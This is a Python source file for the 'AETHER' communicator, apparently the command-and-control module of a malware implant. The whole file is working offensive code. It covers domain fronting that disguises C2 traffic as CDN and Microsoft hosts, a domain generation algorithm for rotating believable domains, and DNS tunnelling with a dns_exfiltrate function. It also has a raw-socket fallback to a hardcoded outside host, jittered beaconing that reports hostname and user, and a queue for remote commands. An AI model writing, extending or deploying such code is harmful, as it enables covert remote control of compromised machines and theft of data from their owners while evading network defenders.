#!/usr/bin/env python3
"""
AETHER Communicator Module
Universal C2 with DGA, Domain Fronting, HTTPS, DNS, and Stealth
"""
import json
import base64
import hashlib
import random
import time
import socket
import ssl
import threading
import queue
import logging
from datetime import datetime, timedelta
from urllib.parse import urlparse
import dns.resolver
import dns.query
import dns.message
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

class AetherCommunicator:
    def __init__(self, config, agent_id):
        self.config = config
        self.agent_id = agent_id
        self.session_id = hashlib.sha256(f"{agent_id}{time.time()}".encode()).hexdigest()[:16]
        
        # C2 Configuration
        self.c2_channels = self._init_c2_channels()
        self.current_channel_idx = 0
        self.fail_count = 0
        self.max_fails = config.get('max_fails', 5)
        
        # Encryption
        self.encryption_key = self._derive_encryption_key(config.get('encryption_key', b'default_key_change_in_production'))
        self.fernet = Fernet(self.encryption_key)
        
        # DGA
        self.dga_seed = config.get('dga_seed', 'aether_universal_class_2024')
        self.dga_domains = []
        self.dga_index = 0
        
        # State
        self.beacon_interval = config.get('beacon_interval', 30)
        self.jitter = config.get('jitter', 5)
        self.last_beacon = 0
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        
        # DNS
        self.dns_resolver = dns.resolver.Resolver()
        self.dns_resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        
        # HTTP(S) Session
        self.http_session = self._create_stealth_session()
        
        # Threading
        self.running = True
        self.beacon_thread = None
        self.processing_thread = None
        
        # Logging
        self.log = self._setup_logging()
        
        # Initialization
        self._generate_dga_domains(10)
        self.log.info(f"Communicator initialized for agent {agent_id[:8]}")
    
    def _init_c2_channels(self):
        """Initialize multi-channel C2 with fallbacks."""
        channels = []
        
        # Primary: HTTPS with Domain Fronting
        channels.append({
            'type': 'https_fronting',
            'host': 'cdn.cloudflare.net',  # Fronting host
            'actual_host': 'api.microsoft.com',  # Actual C2 host
            'port': 443,
            'path': '/update/check',
            'active': True,
            'priority': 1,
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Host': 'cdn.cloudflare.net'  # Domain fronting header
            }
        })
        
        # Secondary: Direct HTTPS to DGA domain
        channels.append({
            'type': 'https_direct',
            'host': None,  # Will be set by DGA
            'port': 443,
            'path': '/api/v1/beacon',
            'active': True,
            'priority': 2,
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
        })
        
        # Tertiary: DNS tunneling
        channels.append({
            'type': 'dns_tunnel',
            'domain': None,  # Will be set by DGA
            'nameserver': '8.8.8.8',
            'query_type': 'TXT',
            'active': True,
            'priority': 3
        })
        
        # Fallback: Raw socket (existing method)
        channels.append({
            'type': 'raw_socket',
            'host': self.config.get('c2_host', 'garden-helper.fi'),
            'port': self.config.get('c2_port', 443),
            'active': True,
            'priority': 4
        })
        
        return channels
    
    def _derive_encryption_key(self, key_material):
        """Derive stable encryption key from config material."""
        if isinstance(key_material, str):
            key_material = key_material.encode()
        
        # Use PBKDF2 for key derivation
        salt = b'aether_salt_' + self.agent_id.encode()[:8]
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = kdf.derive(key_material)
        return base64.urlsafe_b64encode(key)
    
    def _create_stealth_session(self):
        """Create HTTP session with TLS fingerprint evasion."""
        session = requests.Session()
        
        # Custom SSL context to mimic browser
        ctx = create_urllib3_context()
        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:ECDHE+AES256:ECDHE+AES128:DHE+AES256:DHE+AES128')
        ctx.options |= 0x4  # OP_LEGACY_SERVER_CONNECT
        
        adapter = HTTPAdapter(
            pool_connections=10,
            pool_maxsize=10,
            max_retries=3,
            pool_block=True
        )
        adapter.init_poolmanager(ssl_context=ctx)
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        
        return session
    
    def _setup_logging(self):
        """Setup secure logging."""
        log = logging.getLogger(__name__)
        log.setLevel(logging.WARNING)  # Keep quiet
        return log
    
    def _generate_dga_domains(self, count=10):
        """Generate Domain Generation Algorithm domains."""
        self.dga_domains = []
        current_hour = int(time.time() / 3600)
        
        for i in range(count):
            # Deterministic based on seed + hour + index
            seed_data = f"{self.dga_seed}{current_hour + i}{self.agent_id}"
            domain_hash = hashlib.sha256(seed_data.encode()).hexdigest()
            
            # Word list for believable domains
            words = ['cdn', 'api', 'update', 'service', 'cloud', 'storage',
                    'content', 'delivery', 'network', 'platform', 'secure',
                    'global', 'edge', 'host', 'server', 'node', 'cache',
                    'static', 'assets', 'images', 'video', 'audio', 'data',
                    'sync', 'backup', 'mail', 'web', 'ftp', 'ssh']
            
            # Select words
            idx1 = int(domain_hash[0:2], 16) % len(words)
            idx2 = int(domain_hash[2:4], 16) % len(words)
            num = int(domain_hash[4:6], 16) % 100
            
            # TLD rotation
            tlds = ['.com', '.net', '.org', '.info', '.io']
            tld = tlds[int(domain_hash[6:8], 16) % len(tlds)]
            
            # Create domain like: cdn-update-23.com
            domain = f"{words[idx1]}-{words[idx2]}-{num}{tld}"
            
            # Subdomain
            sub = domain_hash[8:14]
            full_domain = f"{sub}.{domain}"
            
            self.dga_domains.append(full_domain)
        
        # Update C2 channels with DGA domains
        for channel in self.c2_channels:
            if channel['type'] == 'https_direct' and self.dga_domains:
                channel['host'] = self.dga_domains[0]
            elif channel['type'] == 'dns_tunnel' and self.dga_domains:
                channel['domain'] = self.dga_domains[0]
    
    def _rotate_dga_domain(self):
        """Rotate to next DGA domain."""
        if not self.dga_domains:
            self._generate_dga_domains(10)
        
        self.dga_index = (self.dga_index + 1) % len(self.dga_domains)
        new_domain = self.dga_domains[self.dga_index]
        
        # Update channels
        for channel in self.c2_channels:
            if channel['type'] == 'https_direct':
                channel['host'] = new_domain
            elif channel['type'] == 'dns_tunnel':
                channel['domain'] = new_domain
        
        return new_domain
    
    def _encrypt_data(self, data):
        """Encrypt data with integrity check."""
        if isinstance(data, dict):
            data = json.dumps(data).encode()
        elif isinstance(data, str):
            data = data.encode()
        
        # Encrypt
        encrypted = self.fernet.encrypt(data)
        
        # Add HMAC for integrity
        hmac = hashlib.sha256(encrypted + self.agent_id.encode()).digest()[:8]
        
        # Base64 encode
        return base64.urlsafe_b64encode(encrypted + hmac)
    
    def _decrypt_data(self, encrypted_data):
        """Decrypt and verify data."""
        try:
            # Base64 decode
            data = base64.urlsafe_b64decode(encrypted_data)
            
            # Split HMAC and encrypted data
            encrypted = data[:-8]
            received_hmac = data[-8:]
            
            # Verify HMAC
            expected_hmac = hashlib.sha256(encrypted + self.agent_id.encode()).digest()[:8]
            if received_hmac != expected_hmac:
                self.log.error("HMAC verification failed")
                return None
            
            # Decrypt
            decrypted = self.fernet.decrypt(encrypted)
            
            # Try to parse as JSON
            try:
                return json.loads(decrypted.decode())
            except:
                return decrypted.decode()
                
        except Exception as e:
            self.log.error(f"Decryption failed: {e}")
            return None
    
    def _send_https_beacon(self, channel, beacon_data):
        """Send beacon via HTTPS."""
        try:
            # Prepare URL
            if channel['type'] == 'https_fronting':
                url = f"https://{channel['actual_host']}{channel['path']}"
                headers = channel['headers'].copy()
                headers['Host'] = channel['host']  # Fronting header
            else:
                url = f"https://{channel['host']}{channel['path']}"
                headers = channel['headers'].copy()
            
            # Encrypt beacon data
            encrypted_beacon = self._encrypt_data(beacon_data)
            
            # Send request
            response = self.http_session.post(
                url,
                data=encrypted_beacon,
                headers=headers,
                timeout=15,
                verify=True  # Use system certs
            )
            
            if response.status_code == 200:
                # Decrypt response
                decrypted_response = self._decrypt_data(response.content)
                self.fail_count = 0
                return decrypted_response
            else:
                self.log.warning(f"HTTPS beacon failed with status {response.status_code}")
                return None
                
        except Exception as e:
            self.log.error(f"HTTPS beacon error: {e}")
            return None
    
    def _send_dns_beacon(self, channel, beacon_data):
        """Send beacon via DNS tunneling."""
        try:
            # Encode data in subdomain
            encoded_data = base64.b32encode(json.dumps(beacon_data).encode()).decode().lower().replace('=', '')
            
            # Split into chunks (DNS labels max 63 chars)
            chunks = [encoded_data[i:i+50] for i in range(0, len(encoded_data), 50)]
            
            for chunk in chunks:
                query_domain = f"{chunk}.{channel['domain']}"
                
                # Send DNS query
                query = dns.message.make_query(query_domain, channel['query_type'])
                response = dns.query.udp(query, channel['nameserver'], timeout=5)
                
                # Check for commands in response
                for answer in response.answer:
                    if answer.rdtype == dns.rdatatype.TXT:
                        for txt_string in answer.strings:
                            txt_str = txt_string.decode()
                            if txt_str.startswith('CMD:'):
                                cmd_data = txt_str[4:]
                                return self._decrypt_data(cmd_data.encode())
            
            return None
            
        except Exception as e:
            self.log.error(f"DNS beacon error: {e}")
            return None
    
    def _send_raw_beacon(self, channel, beacon_data):
        """Send beacon via raw socket (existing method)."""
        try:
            # Encrypt data
            encrypted_data = self._encrypt_data(beacon_data)
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            
            # Wrap with SSL if needed
            if channel['port'] == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=channel['host'])
            
            # Connect and send
            sock.connect((channel['host'], channel['port']))
            sock.sendall(encrypted_data)
            
            # Receive response
            response = sock.recv(65536)
            sock.close()
            
            if response:
                return self._decrypt_data(response)
            return None
            
        except Exception as e:
            self.log.error(f"Raw beacon error: {e}")
            return None
    
    def send_beacon(self, beacon_data):
        """
        Send beacon to C2 (primary interface used by AetherAgent).
        Returns response with commands or None.
        """
        # Add session metadata
        beacon_data['session_id'] = self.session_id
        beacon_data['timestamp'] = datetime.now().isoformat()
        beacon_data['dga_index'] = self.dga_index
        
        # Sort channels by priority
        active_channels = [c for c in self.c2_channels if c.get('active', True)]
        active_channels.sort(key=lambda x: x.get('priority', 99))
        
        response = None
        last_error = None
        
        # Try each channel until success
        for channel in active_channels:
            try:
                if channel['type'] in ['https_fronting', 'https_direct']:
                    response = self._send_https_beacon(channel, beacon_data)
                elif channel['type'] == 'dns_tunnel':
                    response = self._send_dns_beacon(channel, beacon_data)
                elif channel['type'] == 'raw_socket':
                    response = self._send_raw_beacon(channel, beacon_data)
                
                if response:
                    # Process commands from response
                    if 'commands' in response:
                        for cmd in response['commands']:
                            self.command_queue.put(cmd)
                    
                    # Update channel health
                    self.fail_count = 0
                    
                    # Rotate DGA on success (optional)
                    if random.random() < 0.1:  # 10% chance
                        self._rotate_dga_domain()
                    
                    return response
                    
            except Exception as e:
                last_error = e
                channel['active'] = False  # Disable failed channel
                continue
        
        # All channels failed
        self.fail_count += 1
        
        if self.fail_count >= self.max_fails:
            # Enter deep sleep mode
            self.log.error("Max fails reached, entering deep sleep")
            time.sleep(3600)  # Sleep for 1 hour
            self.fail_count = 0
            # Regenerate DGA domains
            self._generate_dga_domains(10)
        
        return None
    
    def send_result(self, cmd_type, result):
        """
        Send command result back to C2.
        Used by AetherAgent.execute_command()
        """
        result_data = {
            'type': 'command_result',
            'session_id': self.session_id,
            'agent_id': self.agent_id,
            'command_type': cmd_type,
            'result': result,
            'timestamp': datetime.now().isoformat()
        }
        
        # Try to send via best available channel
        active_channels = [c for c in self.c2_channels if c.get('active', True)]
        if not active_channels:
            return False
        
        channel = active_channels[0]  # Use highest priority
        
        try:
            if channel['type'] in ['https_fronting', 'https_direct']:
                # For results, we might use a different endpoint
                url = f"https://{channel['host']}/api/v1/result"
                encrypted_result = self._encrypt_data(result_data)
                
                headers = channel['headers'].copy()
                if channel['type'] == 'https_fronting':
                    headers['Host'] = channel.get('actual_host', channel['host'])
                
                self.http_session.post(url, data=encrypted_result, headers=headers, timeout=10)
                return True
                
            elif channel['type'] == 'raw_socket':
                # Use existing socket method
                return self._send_raw_beacon(channel, result_data) is not None
                
        except Exception as e:
            self.log.error(f"Send result failed: {e}")
            return False
        
        return False
    
    def generate_dga_domains(self, count=10):
        """Generate DGA domains - used by agent command."""
        self._generate_dga_domains(count)
        return {
            'count': len(self.dga_domains),
            'domains': self.dga_domains[:5],  # Return first 5 only
            'current': self.dga_domains[self.dga_index] if self.dga_domains else None
        }
    
    def dns_exfiltrate(self, data):
        """Exfiltrate data via DNS - used by agent command."""
        if not self.dga_domains:
            self._generate_dga_domains(5)
        
        channel = next((c for c in self.c2_channels if c['type'] == 'dns_tunnel'), None)
        if not channel:
            return {"error": "DNS tunnel not configured"}
        
        # Use current DGA domain
        channel['domain'] = self.dga_domains[self.dga_index]
        
        exfil_data = {
            'agent_id': self.agent_id,
            'data': data,
            'timestamp': time.time()
        }
        
        result = self._send_dns_beacon(channel, exfil_data)
        return {"success": result is not None, "domain": channel['domain']}
    
    def domain_fronting_test(self):
        """Test domain fronting capability."""
        channel = next((c for c in self.c2_channels if c['type'] == 'https_fronting'), None)
        if not channel:
            return {"error": "Domain fronting not configured"}
        
        test_data = {
            'test': 'domain_fronting',
            'agent_id': self.agent_id,
            'time': datetime.now().isoformat()
        }
        
        try:
            response = self._send_https_beacon(channel, test_data)
            return {
                'success': response is not None,
                'fronting_host': channel['host'],
                'actual_host': channel['actual_host'],
                'response': 'received' if response else 'failed'
            }
        except Exception as e:
            return {"error": str(e)}
    
    def start_beacon_thread(self):
        """Start background beacon thread."""
        if self.beacon_thread and self.beacon_thread.is_alive():
            return
        
        def beacon_worker():
            while self.running:
                try:
                    # Adaptive sleep
                    sleep_time = self.beacon_interval + random.uniform(-self.jitter, self.jitter)
                    time.sleep(sleep_time)
                    
                    # Generate system info for beacon
                    system_info = self._collect_system_info()
                    beacon_data = {
                        'agent_id': self.agent_id,
                        'system_info': system_info,
                        'timestamp': datetime.now().isoformat(),
                        'command_queue_size': self.command_queue.qsize()
                    }
                    
                    # Send beacon
                    self.send_beacon(beacon_data)
                    
                except Exception as e:
                    self.log.error(f"Beacon worker error: {e}")
                    time.sleep(60)  # Backoff on error
        
        self.beacon_thread = threading.Thread(target=beacon_worker, daemon=True)
        self.beacon_thread.start()
    
    def _collect_system_info(self):
        """Collect basic system info for beacon."""
        import platform
        import psutil
        
        return {
            'hostname': platform.node(),
            'os': platform.platform(),
            'user': psutil.Process().username(),
            'cpu_percent': psutil.cpu_percent(interval=0.1),
            'memory_percent': psutil.virtual_memory().percent,
            'boot_time': psutil.boot_time(),
            'process_count': len(psutil.pids())
        }
    
    def get_next_command(self):
        """Get next command from queue (non-blocking)."""
        try:
            return self.command_queue.get_nowait()
        except queue.Empty:
            return None
    
    def stop(self):
        """Stop communicator."""
        self.running = False
        if self.beacon_thread:
            self.beacon_thread.join(timeout=5)

# Factory function for compatibility
def Communicator(config, agent_id):
    return AetherCommunicator(config, agent_id)